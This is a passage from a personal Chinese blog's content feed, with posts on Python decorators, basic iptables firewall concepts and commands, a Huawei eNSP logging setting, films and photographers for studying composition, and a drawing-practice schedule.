class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span></code></pre></div></div><p>固定用法：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>(<span class="hljs-params">*args, **kwargs</span>):</span></span><span class="line">    <span class="hljs-keyword">return</span> func(*args, **kwargs)</span><span class="line"><span class="hljs-keyword">return</span> _</span></code></pre></div></div><h2 id="多装饰器的执行顺序"><a href="#多装饰器的执行顺序" class="headerlink" title="多装饰器的执行顺序"></a>多装饰器的执行顺序</h2><p>预执行顺序是由内而外的，理解的是距离主体越近越提前执行。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">first</span>(<span class="hljs-params">func</span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>():</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method start&quot;</span>)</span><span class="line">        func()</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method end&quot;</span>)</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">second</span>(<span class="hljs-params">func</span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init second method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>():</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call second method start&quot;</span>)</span><span class="line">        func()</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call second method end&quot;</span>)</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@first</span></span><span class="line"><span class="hljs-meta">@second</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call func&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start program&quot;</span>)</span><span class="line"></br></span><span class="line">func()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#init second method</span></span><span class="line"><span class="hljs-comment">#init first method</span></span><span class="line"><span class="hljs-comment">#start program</span></span><span class="line"><span class="hljs-comment">#call first method start</span></span><span class="line"><span class="hljs-comment">#call second method start</span></span><span class="line"><span class="hljs-comment">#call func</span></span><span class="line"><span class="hljs-comment">#call second method end</span></span><span class="line"><span class="hljs-comment">#call first method end</span></span></code></pre></div></div><p>等价原型为：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">first(second(func))()</span></code></pre></div></div><h2 id="带参数的装饰器的基本型"><a href="#带参数的装饰器的基本型" class="headerlink" title="带参数的装饰器的基本型"></a>带参数的装饰器的基本型</h2><p>现在，想要对装饰器加上参数，如何做。</p><p>首先我们要知道，带参数的装饰器与不带参数的装饰器，在行为上是不一样的。</p><p>不带参数的装饰器是这样的：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">@decorate</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span></span><span class="line">    <span class="hljs-keyword">pass</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment">#等效</span></span><span class="line"></br></span><span class="line">func = decorate(func)</span></code></pre></div></div><p>而带参数的装饰器是这样的：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">@decorate(<span class="hljs-params">a,b</span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span></span><span class="line">    <span class="hljs-keyword">pass</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 等效</span></span><span class="line"></br></span><span class="line">func = decorate(a,b)(func)</span></code></pre></div></div><p>由此可以看出，带参数的其实经过了两次调用，所以，我们也必须要装饰器中给出两次调用。</p><p>所以基本型是如下：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">first</span>(<span class="hljs-params">a, b</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">func</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first_wrapper method&quot;</span>)</span><span class="line"></br></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>():</span></span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method start&quot;</span>)</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first method args: &quot;</span>, a, b)</span><span class="line">            func()</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method end&quot;</span>)</span><span class="line">        <span class="hljs-keyword">return</span> _</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@first(<span class="hljs-params"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call func&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;== start program ==&quot;</span>)</span><span class="line"></br></span><span class="line">func()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#init first method</span></span><span class="line"><span class="hljs-comment">#init first_wrapper method</span></span><span class="line"><span class="hljs-comment">#== start program ==</span></span><span class="line"><span class="hljs-comment">#call first method start</span></span><span class="line"><span class="hljs-comment">#first method args:  1 2</span></span><span class="line"><span class="hljs-comment">#call func</span></span><span class="line"><span class="hljs-comment">#call first method end</span></span></code></pre></div></div><p>等效于</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">first(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)(func)()</span></code></pre></div></div><h2 id="主函数与装饰器都有参数"><a href="#主函数与装饰器都有参数" class="headerlink" title="主函数与装饰器都有参数"></a>主函数与装饰器都有参数</h2><p>要想都有参数，其实和上面已经一样了，只是多出了调用参数的环节</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">first</span>(<span class="hljs-params">a, b</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">func</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first_wrapper method&quot;</span>)</span><span class="line"></br></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>(<span class="hljs-params">*args, **kwargs</span>):</span></span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method start&quot;</span>)</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first method args: &quot;</span>, a, b)</span><span class="line">            func(*args, **kwargs)</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method end&quot;</span>)</span><span class="line">        <span class="hljs-keyword">return</span> _</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@first(<span class="hljs-params"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">c, d</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call func, args: &quot;</span>, c, d)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;== start program ==&quot;</span>)</span><span class="line"></br></span><span class="line">func(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)</span></code></pre></div></div><p>等效于</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">first(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)(func)(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)</span></code></pre></div></div><h2 id="使用yield"><a href="#使用yield" class="headerlink" title="使用yield"></a>使用yield</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">first</span>(<span class="hljs-params">a, b</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">func</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first_wrapper method&quot;</span>)</span><span class="line"></br></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>(<span class="hljs-params">*args, **kwargs</span>):</span></span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method start&quot;</span>)</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first method args: &quot;</span>, a, b)</span><span class="line">            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> func(*args, **kwargs):</span><span class="line">                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sum: &quot;</span>, i)</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method end&quot;</span>)</span><span class="line">        <span class="hljs-keyword">return</span> _</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@first(<span class="hljs-params"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">c, d</span>):</span></span><span class="line">    <span class="hljs-keyword">yield</span> <span class="hljs-built_in">sum</span>((c, d))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;== start program ==&quot;</span>)</span><span class="line"></br></span><span class="line">func(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#init first method</span></span><span class="line"><span class="hljs-comment">#init first_wrapper method</span></span><span class="line"><span class="hljs-comment">#== start program ==</span></span><span class="line"><span class="hljs-comment">#call first method start</span></span><span class="line"><span class="hljs-comment">#first method args:  1 2</span></span><span class="line"><span class="hljs-comment">#sum:  7</span></span><span class="line"><span class="hljs-comment">#call first method end</span></span></code></pre></div></div><h2 id="类方法装饰器"><a href="#类方法装饰器" class="headerlink" title="类方法装饰器"></a>类方法装饰器</h2><h3 id="同一个类中，方法使用装饰器"><a href="#同一个类中，方法使用装饰器" class="headerlink" title="同一个类中，方法使用装饰器"></a>同一个类中，方法使用装饰器</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connect</span>():</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_conn</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-string">&quot;&quot;&quot;检查连接状态&quot;&quot;&quot;</span></span><span class="line"></br></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span></span><span class="line">            <span class="hljs-keyword">if</span> self.is_connected():</span><span class="line">                <span class="hljs-keyword">return</span> func(self, *args, **kwargs)</span><span class="line">            <span class="hljs-keyword">else</span>:</span><span class="line">                <span class="hljs-keyword">raise</span> ConnectException(<span class="hljs-string">&quot;Not connected&quot;</span>)</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"><span class="hljs-meta">    @check_conn</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">disconnect</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        self.handle.disconnect(self.conn)</span><span class="line">        self.conn = <span class="hljs-literal">None</span></span></code></pre></div></div><h3 id="在类外使用类中装饰器"><a href="#在类外使用类中装饰器" class="headerlink" title="在类外使用类中装饰器"></a>在类外使用类中装饰器</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Before</span>():</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">command</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wapper</span>(<span class="hljs-params">f</span>):</span></span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;command before&#x27;</span>)</span><span class="line">            <span class="hljs-keyword">return</span> f</span><span class="line">        <span class="hljs-keyword">return</span> wapper</span><span class="line"></br></span><span class="line"></br></span><span class="line">app = Before()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@app.command()</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line">hello()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#command before</span></span><span class="line"><span class="hljs-comment">#hello</span></span></code></pre></div></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>完全不带参数的基本型：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decorator</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-comment"># do some decorator init</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fun_main</span>():</span></span><span class="line">        ...</span><span class="line">        func()</span><span class="line">        ...</span><span class="line">    <span class="hljs-keyword">return</span> func_main</span><span class="line"></br></span><span class="line"><span class="hljs-meta">@decorator</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span></span><span class="line">    ...</span><span class="line"></br></span><span class="line">func()</span><span class="line"><span class="hljs-comment"># 等效于</span></span><span class="line">decorator(func)()</span></code></pre></div></div><p>任意带参数的:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decorator</span>(<span class="hljs-params">*dec_args, **dec_kwargs</span>):</span></span><span class="line">    <span class="hljs-comment"># do some decorator init</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func_init</span>(<span class="hljs-params">func</span>):</span></span><span class="line">        <span class="hljs-comment"># do some func init</span></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func_main</span>(<span class="hljs-params">*func_args, **func_kwargs</span>)</span></span><span class="line"><span class="hljs-function">            ...</span></span><span class="line"><span class="hljs-function">            <span class="hljs-title">func</span>(<span class="hljs-params">*func_args, **func_kwargs</span>)</span></span><span class="line"><span class="hljs-function">            ...</span></span><span class="line"><span class="hljs-function">        <span class="hljs-title">return</span> <span class="hljs-title">func_main</span></span></span><span class="line"><span class="hljs-function">    <span class="hljs-title">return</span> <span class="hljs-title">func_init</span></span></span><span class="line"></br></span><span class="line"><span class="hljs-function">@<span class="hljs-title">decorator</span>(<span class="hljs-params">a, b</span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-title">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">*func_args, **func_kwargs</span>):</span></span><span class="line">    ...</span><span class="line"></br></span><span class="line">func(c, d)</span><span class="line"><span class="hljs-comment"># 等效于</span></span><span class="line">decorator(a, b)(func)(c, d)</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>iptable 防火墙</title>
      <link href="/2021/08/20/iptable-%E9%98%B2%E7%81%AB%E5%A2%99/"/>
      <url>/2021/08/20/iptable-%E9%98%B2%E7%81%AB%E5%A2%99/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>iptable 其实是netfilter的对外接口，内核防火墙其实是netfilter</p><p>iptable 有链和表的概念，还有包处于什么位置</p><p><img src="/2021/08/20/iptable-%E9%98%B2%E7%81%AB%E5%A2%99/1.png"></p><p>这就是iptable的运行图，有5个链：<br><code>prerouting</code> <code>forwording</code> <code>postrouting</code> <code>input</code> <code>output</code></p><p>有4个基本表：<br><code>raw</code> <code>mangle</code> <code>nat</code> <code>filter</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-css codeBlockLines"><span class="line"><span class="hljs-attribute">filter</span>表：负责过滤功能，防火墙；内核模块：iptables_filter</span><span class="line"></br></span><span class="line">nat表：network <span class="hljs-selector-tag">address</span> translation，网络地址转换功能；内核模块：iptable_nat</span><span class="line"></br></span><span class="line">mangle表：拆解报文，做出修改，并重新封装 的功能；iptable_mangle</span><span class="line"></br></span><span class="line">raw表：关闭nat表上启用的连接追踪机制；iptable_raw</span></code></pre></div></div><h3 id="匹配规则"><a href="#匹配规则" class="headerlink" title="匹配规则"></a>匹配规则</h3><p>匹配规则分为标准匹配和扩展匹配，也就是基于IP和基于端口的匹配</p><h3 id="动作"><a href="#动作" class="headerlink" title="动作"></a>动作</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line">ACCEPT：允许数据包通过。</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">DROP</span>：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。</span><span class="line"></br></span><span class="line">REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。</span><span class="line"></br></span><span class="line">SNAT：源地址转换，解决内网用户用同一个公网地址上网的问题。</span><span class="line"></br></span><span class="line">MASQUERADE：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上。</span><span class="line"></br></span><span class="line">DNAT：目标地址转换。</span><span class="line"></br></span><span class="line">REDIRECT：在本机做端口映射。</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">LOG</span>：在/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。</span></code></pre></div></div><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><ul><li><p>查看</p><ul><li><code>iptables -L</code> 默认就是查看filter 表的 INPUT 链</li><li><code>iptables -nvL INPUT --line-numbers</code>  查看详情</li></ul></li><li><p><a href="http://blog.51yip.com/linux/1404.html">这里</a>是iptables 的增删改查命令</p></li></ul><p>清除计数为<code>-Z</code></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为eNSP 关闭Log</title>
      <link href="/2021/08/17/%E5%8D%8E%E4%B8%BAeNSP-%E5%85%B3%E9%97%ADLog/"/>
      <url>/2021/08/17/%E5%8D%8E%E4%B8%BAeNSP-%E5%85%B3%E9%97%ADLog/</url>
      
        <content type="html"><![CDATA[<p>华为的模拟器<code>eNSP</code>默认对变更会有Log产生，非常影响操作。关闭的方法如下：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pf codeBlockLines"><span class="line">info-center source DS channel <span class="hljs-number">0</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">state</span> off  trap <span class="hljs-keyword">state</span> off</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 数通 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>绘画最适合学习的构图和光影的电影</title>
      <link href="/2021/08/11/%E7%BB%98%E7%94%BB%E6%9C%80%E9%80%82%E5%90%88%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9E%84%E5%9B%BE%E5%92%8C%E5%85%89%E5%BD%B1%E7%9A%84%E7%94%B5%E5%BD%B1/"/>
      <url>/2021/08/11/%E7%BB%98%E7%94%BB%E6%9C%80%E9%80%82%E5%90%88%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9E%84%E5%9B%BE%E5%92%8C%E5%85%89%E5%BD%B1%E7%9A%84%E7%94%B5%E5%BD%B1/</url>
      
        <content type="html"><![CDATA[<h2 id="最值得绘画人学习的摄影大神"><a href="#最值得绘画人学习的摄影大神" class="headerlink" title="最值得绘画人学习的摄影大神"></a>最值得绘画人学习的摄影大神</h2><p>Henri Cartier-Bresson   纪实摄影最高峰，决定性的瞬间</p><p>W.Eugene Smith  连续摄影纪实天才，构图完美几乎无劣作</p><p>Jacques Henri Lartigue  动态感</p><p>Elliott Erwitt 人物街拍大师</p><p>Mark Cohen  街头偷拍变态</p><p>荒木经惟    撸猫的变态</p><p>山本昌男    小尺寸构图巨匠</p><p>森山大道    黑白街拍</p><p>蜷川实花   艳丽色彩</p><p>Josef Koudelka   构图寓意大神</p><p>Arnold Newman  专拍大师肖像</p><p>Robert Capa  战地纪实</p><p>Irving Penn  时尚和构图，vogue风</p><p>Vivian Maier  摄影天赋的保姆</p><p>Steve McCurry  《国家地理》首席摄影</p><p>Ansel Adams  黑白风景构图</p><p>Helen Levitt   彩色街头摄影</p><p>Pete Turner   色彩构图必学</p><p>Robert Frank  记录美国生活</p><p>Saul Leiter   意境特写，朦胧人物</p><p>Harry Callahan   线条，抽象</p><p>Ernst Haas   色彩和创意构图</p><p>Fred Herzog   电影色彩</p><p>Stephen Shore    色彩空间构成</p><p>Platon  大透视，肖像摄影王</p><p>Annie Leibovitz   约稿价最高名人摄影</p><p>Joel Meyerowitz  彩色摄影先锋</p><h2 id="史上最适合学习构图和光影色彩的电影"><a href="#史上最适合学习构图和光影色彩的电影" class="headerlink" title="史上最适合学习构图和光影色彩的电影"></a>史上最适合学习构图和光影色彩的电影</h2><p>《The Grand Budapest Hotel （布达佩斯大饭店）》</p><p>《Moonrise Kingdom （月亮升起之王国）》</p><p>《Mad Max: Fury Road （疯狂的麦克斯4：狂暴之路）》</p><p>《What Dreams May Come （美梦成真）》</p><p>《Gravity （地心引力）》</p><p>《Interstellar（星际穿越）》</p><p>《Life Of Pi （少年派的奇幻漂流）》</p><p>《The Fall（坠入）》</p><p>《さくらん （花魁）》</p><p>《リトル・フォレスト 小森林》（2014，2015）</p><p>《花样年华》</p><p>《2046》</p><p>《力王》</p><p>《Volver （回归）》</p><p>《Paris, Texas （德州巴黎）》</p><p>《Equilibrium （撕裂的末日）》</p><p>《The Revenant （荒野猎人）》</p><p>《The Tree of Life （生命之树）》</p><p>《007 Skyfall （007大破天幕杀机）》</p><p>《Batman Dark Knight（蝙蝠侠黑暗骑士）》(2008，2012)</p><p>《En la ciudad de Sylvia在希尔维亚城中 》</p><p>《Inception（盗梦空间）》</p><p>《The Matrix（黑客帝国）》</p><p>《Alice in Wonderland （爱丽丝梦游仙境）》（2010）</p><p>《Independence Day（独立日）》</p><p>《Prometheus （普罗米修斯）》</p><p>《Watchmen （守望者）》</p><p>《Perfume: The Story of a Murderer（香水）》</p><p>《2001: A Space Odyssey （2001太空漫游 2001）》</p><p>《Gladiator （角斗士）》</p><p>《Leap Year （闰年 ）》</p><p>《Artificial Intelligence: AI （人工智能）》</p><p>《Super man Man of Steel （超人：钢铁之躯）》</p><p>《Real Steel（铁甲钢拳 ）》</p><p>《The Nightmare Before Christmas （圣诞夜惊魂）》</p><p>《Æon Flux 魔力女战士》</p><p>《King Kong （金刚）》（2005）</p><p>《Joker （小丑）》（2019）</p><p>《Sucker Punch（美少女特攻队）》</p><p>《300 (斯巴达300勇士) 》(2006)</p><p>《Sin City (罪恶之城)》(2005)</p><p>《Ghost in Shell (攻壳机动队)》(2017)</p><p>《Blade Runner （银翼杀手）》（1982，2017）</p>]]></content>
      
      
      <categories>
          
          <category> 绘画 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>绘画阶段时间分配</title>
      <link href="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/"/>
      <url>/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/</url>
      
        <content type="html"><![CDATA[<p>参考<a href="https://www.bilibili.com/video/BV1a44y1C7Dj">抖抖村</a>的时间分配计划, 总共6年，每天3小时以上的绘画练习</p><h2 id="0-6-个月"><a href="#0-6-个月" class="headerlink" title="0~6 个月"></a>0~6 个月</h2><p>运笔练习以及兴趣培养</p><h2 id="6个月-1年"><a href="#6个月-1年" class="headerlink" title="6个月 ~ 1年"></a>6个月 ~ 1年</h2><p>这个阶段要精准临摹</p><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/1.png"></p><p>如果精准临摹没有练习好，那么后面的透视、明暗、人体结构、构图效果都会大打折扣</p><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/2.png"></p><h2 id="1-2-年"><a href="#1-2-年" class="headerlink" title="1 ~ 2 年"></a>1 ~ 2 年</h2><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/3.png"></p><p>在这个阶段耐心完成原稿</p><h2 id="2-3-年"><a href="#2-3-年" class="headerlink" title="2 ~ 3 年"></a>2 ~ 3 年</h2><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/4.png"></p><p>这个阶段主要是速写并形成积累</p><p><a href="/2021/08/11/%E7%BB%98%E7%94%BB%E6%9C%80%E9%80%82%E5%90%88%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9E%84%E5%9B%BE%E5%92%8C%E5%85%89%E5%BD%B1%E7%9A%84%E7%94%B5%E5%BD%B1/" title="绘画最适合学习的构图和光影的电影">绘画最适合学习的构图和光影的电影</a></p><p>已成稿为导向，通过画成稿，发现问题，解决问题，然后继续画成稿的方式来提升自己。</p><h2 id="3-4-年"><a href="#3-4-年" class="headerlink" title="3 ~ 4 年"></a>3 ~ 4 年</h2><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/5.png"></p><p>这里的成稿已经是代表自己最高研究成果的成稿了</p><p>然后就是重新通过速涂审视自己的基本功，发掘更深一层次的东西</p><h2 id="4-6-年"><a href="#4-6-年" class="headerlink" title="4 ~ 6 年"></a>4 ~ 6 年</h2><p><img src="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/6.png"></p><p>这个阶段绘画水平已经更高了，想要更进一步的提升设计、构图、讲故事的能力，就需要用历史、传统艺术、摄影等来武装自己。</p>]]></content>
      
      
      <categories>
          
          <category> 绘画 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>绘画网站推荐</title>
      <link href="/2021/08/09/%E7%BB%98%E7%94%BB%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90/"/>
